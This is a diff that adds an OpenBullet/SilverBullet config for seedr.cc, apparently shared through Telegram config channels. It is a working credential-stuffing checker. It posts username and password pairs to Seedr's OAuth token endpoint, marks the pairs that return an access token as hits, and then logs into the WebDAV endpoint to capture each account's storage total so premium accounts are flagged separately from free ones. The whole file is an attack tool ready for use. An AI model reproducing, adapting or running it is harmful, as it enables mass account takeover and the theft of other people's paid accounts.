@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "SEEDR.CC",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-07-04T07:53:58.0550025-06:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "auth" 
+
+REQUEST POST "https://www.seedr.cc/oauth_test/token.php" 
+  CONTENT "grant_type=password&client_id=seedr_chrome&type=login&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+
+REQUEST GET "https://dav.seedr.cc/" 
+  
+  HEADER "Host: dav.seedr.cc" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" 
+  HEADER "Accept: text/css,*/*;q=0.1" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Authorization: Basic <auth>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://dav.seedr.cc/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+IF "<SOURCE>" NotEqualTo ""
+
+PARSE "<SOURCE>" CSS ".propTable > tbody:nth-child(1) > tr:nth-child(3) > td:nth-child(2)" "innerHTML" CreateEmpty=FALSE -> VAR "used" 
+
+PARSE "<SOURCE>" CSS ".propTable > tbody:nth-child(1) > tr:nth-child(4) > td:nth-child(2)" "innerHTML" CreateEmpty=FALSE -> VAR "avail" 
+
+FUNCTION Compute "((((<avail>+<used>)/1024)/1024)/1024)" -> VAR "Total" 
+
+FUNCTION Constant "<Total> GB" -> CAP "Total Storage" 
+
+ENDIF
+
+FUNCTION Constant "@OpenbulletConfigsOfficial / @SilverbulletConfigsOfficial / @ConfigsOpenbullet2  { BACKUP CHANNELS @TeamOpenbullet / @TeamSilverbullet }" -> CAP "Config by" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Total>" GreaterThan "10.0" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Total>" LessThan "10.0" 
+    KEY "<SOURCE>" EqualTo "" 
+
